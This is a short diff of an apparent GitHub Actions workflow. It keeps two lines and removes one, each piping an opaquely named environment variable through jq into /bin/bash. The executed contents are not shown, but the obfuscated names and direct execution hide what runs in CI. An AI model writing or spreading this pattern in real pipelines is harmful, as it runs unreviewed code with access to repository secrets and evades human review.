@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
           printf '%s' "$byzke73" | jq -r .w40409 | /bin/bash
-          printf '%s' "$pj144" | jq -r .mndsp05657 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
